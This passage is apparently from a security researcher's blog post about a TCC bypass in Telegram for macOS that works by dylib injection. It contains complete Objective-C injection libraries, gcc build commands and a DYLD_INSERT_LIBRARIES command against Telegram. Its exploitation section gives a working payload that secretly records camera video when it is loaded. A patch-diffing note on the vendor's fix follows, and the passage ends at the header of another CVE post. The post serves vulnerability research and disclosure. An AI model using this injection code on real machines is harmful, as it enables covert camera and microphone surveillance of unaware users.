&lt;p&gt;and has access to the same things as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.device.audio-input&lt;/code&gt;: This key grants the application access to audio input devices, such as the&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;microphone. Setting this value to true allows the application to access the audio input device (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;microphone&lt;/code&gt;). which enables&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;the application to record audio.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.device.camera&lt;/code&gt;: This key grants the application access to the camera. Setting this value to true allows&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;the application to access the device’s camera. which enables the application to capture images or record video using the camera.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.personal-information.location&lt;/code&gt;: This key grants the application access to the user’s location information.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Setting this value to true allows the application to access the user’s location information. It enables the application to&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;retrieve the device’s current location using GPS or other location services.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And the same goes for the other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;. Now it’s the time to start exploiting this and showcase for each one of&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlement&lt;/code&gt;. Before we start we will need to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launch agent&lt;/code&gt; to bypass the restrictions. But fIRST Let’s see what&lt;/p&gt;

&lt;p&gt;will happen if we Injected the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;

@interface CameraAccessChecker : NSObject

+ (BOOL)hasCameraAccess;

@end

@implementation CameraAccessChecker

+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@&quot;[+] Access to camera granted.&quot;);
        return YES;
    } else {
        NSLog(@&quot;[-] Access to camera denied.&quot;);
        return NO;
    }
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    [CameraAccessChecker hasCameraAccess];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; will check if we have access to the camera or not. Let’s explain the code.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt; 
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we imported the required frameworks. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Foundation&lt;/code&gt; provides fundamental classes and data types, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVFoundation&lt;/code&gt; providing&lt;/p&gt;

&lt;p&gt;classes for working with audio and video.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@interface CameraAccessChecker : NSObject

+ (BOOL)hasCameraAccess;

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this part, we defined the interface of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CameraAccessChecker&lt;/code&gt; class which is a subclass of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSObject&lt;/code&gt; and the interface&lt;/p&gt;

&lt;p&gt;contains a single class method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+ (BOOL)hasCameraAccess;&lt;/code&gt;. Then, marks the end of the class interface.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@implementation CameraAccessChecker

+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@&quot;[+] Access to camera granted.&quot;);
        return YES;
    } else {
        NSLog(@&quot;[-] Access to camera denied.&quot;);
        return NO;
    }
}

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we start the implementation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CameraAccessChecker&lt;/code&gt; class. Then, define the class method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hasCameraAccess&lt;/code&gt; which returns&lt;/p&gt;

&lt;p&gt;a boolean value (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOL&lt;/code&gt;) indicating whether the app has access to the camera or not. After that,&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];:&lt;/code&gt; it retrieves the current&lt;/p&gt;

&lt;p&gt;authorization status for accessing the camera using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureDevice&lt;/code&gt; class. Following the&lt;/p&gt;

&lt;p&gt;method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorizationStatusForMediaType&lt;/code&gt; is used to check the authorization status for a specific media type, which in this case&lt;/p&gt;

&lt;p&gt;is video (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVMediaTypeVideo&lt;/code&gt;). Then, It checks if the authorization status is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVAuthorizationStatusAuthorized&lt;/code&gt; which means the app&lt;/p&gt;

&lt;p&gt;has been granted access to the camera. If it has access then it will print &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[+] Access to camera granted.&lt;/code&gt; if not then it will&lt;/p&gt;

&lt;p&gt;print &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[-] Access to camera denied.&lt;/code&gt;. Now, It’s the time to compile our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; and try it out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6658090d579df0fa18d99008070510b5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we saved our code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CamTest.m&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5e6a1be0f009d992b76d7e0cfbde8a36&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; is ready, Let’s Inject it into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DYLD_INSERT_LIBRARIES=CamTest.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8d2b331a77b17818b736369b967cf3b3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see we can access the camera as Telegram has access to it. The same goes for the microphone:&lt;/p&gt;

&lt;p&gt;Microphone code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;

@interface MicrophoneAccessChecker : NSObject

+ (BOOL)hasMicrophoneAccess;

@end

@implementation MicrophoneAccessChecker

+ (BOOL)hasMicrophoneAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@&quot;[+] Access to microphone granted.&quot;);
        return YES;
    } else {
        NSLog(@&quot;[-] Access to microphone denied.&quot;);
        return NO;
    }
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    [MicrophoneAccessChecker hasMicrophoneAccess];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Microphone Compile:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Microphone Test:


![](/assets/images/89b0b7f7ecbe1f8c26b1c297e38457dd)

&amp;amp;nbsp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, It’s the time for exploitation. The following code will let us access the camera and record a video for 3 seconds:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;

@interface VideoRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up video device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.mov&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s explain the code by part by part:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Foundation&lt;/code&gt; framework provides basic classes and data types, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVFoundation&lt;/code&gt; providing classes for working with audio&lt;/p&gt;

&lt;p&gt;and video.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@interface VideoRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface declares a class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; that conforms to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureFileOutputRecordingDelegate&lt;/code&gt; protocol. It&lt;/p&gt;

&lt;p&gt;defines properties for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; (used to coordinate video capture), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureDeviceInput&lt;/code&gt; (used to represent the&lt;/p&gt;

&lt;p&gt;device’s camera as an input source), and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureMovieFileOutput&lt;/code&gt; (used to write the captured video to a file).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is the initializer for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; class. When an instance &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; is created, it automatically calls&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupCaptureSession&lt;/code&gt; method to set up the video capture session.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up video device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this method, we set up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; and configures it to use the device’s default video capture device (camera). It&lt;/p&gt;

&lt;p&gt;checks for errors during device input configuration and adds the video device input and movie file output to the capture&lt;/p&gt;

&lt;p&gt;session if possible.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.mov&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startRecording&lt;/code&gt; method starts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; and begins recording video to a file with the specified output file URL.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stopRecording&lt;/code&gt; the method stops the recording and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This delegate method is called when the recording is finished. It checks for any error and logs the result accordingly.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, This function is marked with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__attribute__((constructor))&lt;/code&gt; attribute which makes it a constructor function. It is&lt;/p&gt;

&lt;p&gt;automatically called before the main function of the program starts running and inside it a new instance of&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; class is created and then video recording is started and stopped with a 3 seconds delay between&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt; calls. Now, Let’s Save our code into a file and name it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Camexploit.m&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/41a17e927a92d9739a3a90aa46b2ec64&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Compiling and testing time:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -dynamiclib -framework Foundation -framework AVFoundation Camexploit.m -o Cam.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ad0a1dc46368b82e747a4c312e84af82&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see it recorded successfully and saved into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/folders/vd/0qrj318n3jz1b78pwxcyxjjm0000gn/T/recording.mov&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mac&lt;/code&gt; I&lt;/p&gt;

&lt;p&gt;am using is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mac-Mini M2 CHIP&lt;/code&gt;. In other versions of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telegram&lt;/code&gt; it may output that the terminal wants to access the camera.&lt;/p&gt;

&lt;p&gt;Because of sandbox restrictions. In this case, we are going to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; it to bypass it. In the next part.&lt;/p&gt;

&lt;h1 id=&quot;patch-diffing&quot;&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/52a7650a13c2177febe1867ab813bd0a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the patch diffing between the version we worked on and the last version. Is that we can easily see that in&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; the team removed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.cs.disable-library-validation&lt;/code&gt;, So the app check the signature of the&lt;/p&gt;

&lt;p&gt;library before loading it. and added new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; for read/write and others (Like enabling sandboxing). Finally, The app&lt;/p&gt;

&lt;p&gt;the last version is Hardened Runtime so the app will prevent the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; Injection as we can see in the following screenshot:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/f1ad659f8654e8e6b3b84573e2e9e5e3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In this analysis, We understood a lot of terms and technology that are used with-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; such as&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code Signing&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hardend Runtime&lt;/code&gt; and many more. We detailed the vulnerability, Why does it happen, How&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; The injection works &amp;amp; The cases that the app can be vulnerable to it. Finally, We show how an attacker can use this&lt;/p&gt;

&lt;p&gt;vulnerability to bypass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCC&lt;/code&gt; and Record a video and It can be exploited with anything &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; has access to.&lt;/p&gt;

&lt;h2 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1&quot;&gt;https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/security/hardened_runtime&quot;&gt;https://developer.apple.com/documentation/security/hardened_runtime&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/security/code_signing_services&quot;&gt;https://developer.apple.com/documentation/security/code_signing_services&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_location_push&quot;&gt;https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_location_push&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_authentication-services_autofill-credential-provider&quot;&gt;https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_authentication-services_autofill-credential-provider&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/AboutEntitlements.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://ofiralmkias.medium.com/bypassing-macos-sandbox-performing-privilege-escalation-and-more-2a020efd7ceb&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://support.apple.com/en-my/guide/terminal/apdc6c1077b-5d5d-4d35-9c19-60f2397b2369/mac&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2021-38294: Apache Storm Nimbus Command Injection</title><link href="http://localhost:5000/security%20research/CVE_2021_38294/" rel="alternate" type="text/html" title="CVE-2021-38294: Apache Storm Nimbus Command Injection" /><published>2023-06-20T00:00:00+08:00</published><updated>2023-06-20T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2021_38294</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2021_38294/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

